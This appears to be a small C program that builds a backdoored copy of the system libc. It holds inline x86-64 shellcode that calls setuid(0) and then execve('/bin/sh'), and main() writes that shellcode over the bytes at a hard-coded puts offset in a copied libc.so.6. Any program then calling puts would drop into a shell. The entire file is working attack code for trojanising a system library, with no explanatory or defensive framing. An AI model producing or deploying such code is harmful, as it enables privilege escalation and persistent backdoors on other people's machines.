#include <stdio.h>
#include <stdlib.h>


void shellcode(){
__asm(  "xorq %rdi,%rdi\n\t"
        "mov $0x69,%rax\n\t"
        "syscall \n\t"
        "xorq   %rdx, %rdx \n\t"
        "movq   $0x68732f6e69622fff,%rbx; \n\t"
        "shr    $0x8, %rbx; \n\t"
        "push   %rbx; \n\t"
        "movq   %rsp,%rdi; \n\t"
        "xorq   %rax,%rax; \n\t"
        "pushq  %rax; \n\t"
        "pushq  %rdi; \n\t"
        "movq   %rsp,%rsi; \n\t"
        "mov    $0x3b,%al; \n\t"
        "syscall ; \n\t"
        "nop ; nop ; nop ; nop ; nop ; \n\t"
);
}

int main(){
	
	unsigned long putsAddress = 0x0000000000074040L;
	unsigned char* addr = (unsigned char*) shellcode;
	FILE* F = fopen("/lib/x86_64-linux-gnu/libc.so.6", "rb");
	FILE* G = fopen("libc.so.6", "wb");
	
	char c; unsigned long j;
	for(j=0; j<putsAddress;j++){
		c = fgetc(F);
		fputc(c,G);
	}
	
	int num_nop = 0;
	int i = 0;
	while(1){
		fgetc(F);
		fputc(addr[i], G);
		if(addr[i]==0x90){
			num_nop++;
			if (num_nop==5) break;
		}
		else {
			num_nop = 0;
		}
		i++;
	}
	
	while(!feof(F)){
		c = fgetc(F);
		fputc(c, G);
	}
	fclose(F);
	fclose(G);
	
}
